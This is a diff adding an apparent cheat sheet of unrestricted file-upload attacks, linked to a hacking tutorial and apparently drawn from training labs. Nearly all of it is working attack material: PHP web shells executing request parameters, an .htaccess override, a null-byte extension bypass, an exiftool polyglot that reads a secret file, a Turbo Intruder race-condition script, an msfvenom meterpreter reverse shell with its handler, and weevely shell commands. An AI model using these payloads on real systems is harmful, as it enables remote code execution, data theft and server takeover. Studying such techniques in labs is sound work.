@@ -1,0 +1,53 @@
+https://www.hackingarticles.in/comprehensive-guide-on-unrestricted-file-upload/
+
+
+<?php system($_GET['command']); ?>
+<?php system($_GET['command']);
+==================================
+filename=".htaccess"
+SetHandler application/x-httpd-php
+
+=====================================
+%00.jpg
+=====================================
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+=====================================
+cp shell.php shell.php.png
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+turbo intruder
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)
+
+    request1 = '''<YOUR-POST-REQUEST>'''
+
+    request2 = '''<YOUR-GET-REQUEST>'''
+
+    # the 'gate' argument blocks the final byte of each request until openGate is invoked
+    engine.queue(request1, gate='race1')
+    for x in range(5):
+        engine.queue(request2, gate='race1')
+
+    # wait until every 'race1' tagged request is ready
+    # then send the final byte of each request
+    # (this method is non-blocking, just like queue)
+    engine.openGate('race1')
+
+    engine.complete(timeout=60)
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+
+https://www.youtube.com/watch?v=fEymBXiGsGw
+==============================================
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.7 lport=4444 -f raw
+
+msf > use multi/handler
+msf exploit(handler) > set payload php/meterpreter/reverse_tcp
+msf exploit(handler) > set lhost 192.168.0.7
+msf exploit(handler) > set lport 4444
+msf exploit(handler) > exploit
+==============================================
+#weevely
+weevely generate cyber /home/kali/shell.php
+weevely http://192.168.1.5/dvwa/hackable/uploads/shell.php cyber
